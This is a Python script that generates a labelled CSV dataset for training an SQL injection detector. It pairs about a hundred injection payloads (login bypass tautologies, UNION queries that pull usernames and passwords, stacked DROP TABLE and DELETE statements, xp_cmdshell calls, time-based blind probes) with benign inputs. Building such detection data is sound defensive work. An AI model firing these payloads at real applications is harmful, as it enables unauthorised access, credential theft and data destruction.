import os
import csv

def generate_dataset(output_path):
    # Core SQL Injection payloads
    sqli_payloads = [
        # Tautologies and basic auth bypasses
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or ('1'='1",
        "1' or '1'='1",
        "1\" or \"1\"=\"1",
        "' OR ''='",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "' or 1=1 LIMIT 1",
        "' or 1=1 limit 1 --",
        
        # Union-based SQL injection
        "1 UNION SELECT 1, 2, 3",
        "1' UNION SELECT null, null, null--",
        "1\" UNION SELECT null, null, null--",
        "1 UNION SELECT username, password FROM users",
        "1' UNION SELECT username, password FROM users--",
        "1' UNION SELECT null, username, password FROM users --",
        "1' UNION SELECT null, table_name FROM information_schema.tables --",
        "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --",
        "1' UNION SELECT @@version, null, null--",
        "1' UNION SELECT null, user(), database() --",
        "1 UNION ALL SELECT 1,2,3,4--",
        "1' UNION ALL SELECT null, null, null--",
        
        # Error-based SQL injection
        "1' AND extractvalue(1, concat(char(126), md5(123)))--",
        "1' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--",
        "1' AND (SELECT 1 FROM (SELECT count(*), concat(floor(rand(0)*2), database())x FROM information_schema.tables GROUP BY x)a)--",
        
        # Stacked queries / Data modification
        "1; DROP TABLE users; --",
        "1'; DROP TABLE logs; --",
        "1; DELETE FROM users; --",
        "1'; UPDATE users SET password='hacked' --",
        "1; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",
        
        # Time-based / Blind SQL injection
        "1; SELECT pg_sleep(5)--",
        "1' AND (SELECT 5013 FROM (SELECT(SLEEP(5)))a)--",
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))temp)--",
        
        # Boolean-based blind SQL injection
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND (SELECT 1) = 1--",
        "1' AND (SELECT ascii(substring(password,1,1)) FROM users WHERE username='admin') > 64--",
        
        # Alternate encodings and obfuscation
        "1%20UNION%20SELECT%20null,%20username,%20password%20FROM%20users%20--",
        "1%27%20OR%20%271%27%3D%271",
        "1'/**/OR/**/'1'='1",
        "1'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--",
        "EXEC xp_cmdshell('dir');--",
        "EXEC sp_executesql N'SELECT * FROM users';--",
        "' OR 'x'='x",
        "1' OR 'x'='x' --",
        "1' OR 'x'='x' #",
        
        # Additional common payloads
        "'; shutdown --",
        "'; exec master..xp_cmdshell 'ping 127.0.0.1' --",
        "admin' or 1=1 or ''='",
        "'; select * from information_schema.tables --",
        "1' or 1=1 or ''='",
        "1\" or 1=1 or \"\"=\"",
        "' or 'a'='a",
        "\" or \"a\"=\"a",
        "') or ('a'='a",
        "')) or (('a'='a",
        "1' order by 1--",
        "1' order by 2--",
        "1' order by 3--",
        "1' order by 50--",
        "1' group by 1--",
        
        # More sophisticated vectors
        "1 AND 1=1",
        "1 AND 1=2",
        "1 AND (SELECT count(*) FROM users) > 0",
        "1' AND (SELECT count(*) FROM users) > 0--",
        "1' OR (SELECT count(*) FROM users) > 0--",
        "' AND '1'='1",
        "' OR '1'='2",
        "1' AND sleep(10) OR '1'='1",
        "1' AND 1=1 AND 'a'='a",
        "1' AND 1=2 AND 'a'='a",
        "1' AND 9=9 AND 'x'='x",
        "1' AND 9=8 AND 'x'='x",
        "1' OR 2+2=4",
        "1' OR 2+2=5",
        "1' OR 3*3=9",
        "1' OR 3*3=10",
        "1' OR 'abc'='abc'",
        "1' OR 'abc'='def'",
        "1' OR length('abc')=3",
        "1' OR length('abc')=4"
    ]
    
    # Safe payloads (ordinary inputs, search strings, alphanumeric, system fields)
    safe_payloads = [
        # Search queries
        "hello world",
        "search query for security systems",
        "how to learn python",
        "best models for classification",
        "scikit-learn tutorial for beginners",
        "react vite templates setup",
        "flask api blueprints guide",
        "sqlite database visual studio code",
        "SQL injection vs Cross Site Scripting",
        "understanding agentic coding and AI",
        
        # User input fields / Profiles
        "admin",
        "operator",
        "user123",
        "john.doe",
        "rishi",
        "alex_99",
        "sarah_smith",
        "guest_user",
        "root_admin",
        "security_analyst",
        
        # Emails
        "admin@suraksha.ai",
        "agent@suraksha.ai",
        "test@example.com",
        "john.doe@gmail.com",
        "info@security.org",
        
        # Standard alphanumeric values and IDs
        "12345",
        "987654321",
        "abc123xyz",
        "session_key_98765",
        "abcdef1234567890",
        "UUID-992-104-12",
        "id=102",
        "page=5",
        "limit=20",
        "offset=0",
        
        # Plain English sentences
        "This is a safe comment written by a real user.",
        "Please select a book from the shelf.",
        "Let's review the reports tomorrow morning.",
        "The server is running smoothly.",
        "Wait for the process to complete before shut down.",
        "I need to delete my older account.",
        "Can you drop me a mail at info@security.org?",
        "Please sleep early, tomorrow is a busy day.",
        "The union of the two datasets was successful.",
        "We need to execute the plan on Monday.",
        
        # Natural punctuation/quotes usage
        "O'Connor",
        "O'Reilly",
        "d'Artagnan",
        "That's a great feature!",
        "It's 10:30 AM right now.",
        "Who's there?",
        "Users' passwords must be strong.",
        "Standard JSON format: {\"name\": \"Test\"}",
        "URL formatting: http://localhost:5000/api/health",
        
        # Numeric / mathematical inputs
        "1 + 1 = 2",
        "3 * 4 = 12",
        "50% discount",
        "Total count: 100",
        "Rating: 4.5/5",
        "version 1.0.0-Beta",
        
        # Tech related sentences
        "We are importing scikit-learn and pandas.",
        "Training a Random Forest model on python.",
        "The accuracy of the model is 98.5%.",
        "Select * from the dashboard menu.",
        "Use the drop-down to filter records.",
        "Update the application version to 1.1.0.",
        "Delete the temporary files in logs.",
        "A secure password requires numbers and special characters.",
        "This is an empty string.",
        "Let's check the logs database for failures."
    ]

    # Duplicate some payloads or add variations to populate more rows
    # Target: At least 150 rows of SQLi and 150 rows of Safe
    while len(sqli_payloads) < 150:
        base = sqli_payloads[len(sqli_payloads) % 20]
        # Add slight modifications to make a new payload
        sqli_payloads.append(f"{base} -- {len(sqli_payloads)}")

    while len(safe_payloads) < 150:
        base = safe_payloads[len(safe_payloads) % 20]
        safe_payloads.append(f"{base} {len(safe_payloads)}")

    # Combine and save
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    with open(output_path, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['payload', 'label'])
        
        # Write alternating to mix them up
        for sqli, safe in zip(sqli_payloads, safe_payloads):
            writer.writerow([sqli, 1])
            writer.writerow([safe, 0])

    print(f"Dataset generated at {output_path} with {len(sqli_payloads) + len(safe_payloads)} rows.")

if __name__ == "__main__":
    import sys
    dest = sys.argv[1] if len(sys.argv) > 1 else "../datasets/raw/default_dataset.csv"
    generate_dataset(dest)
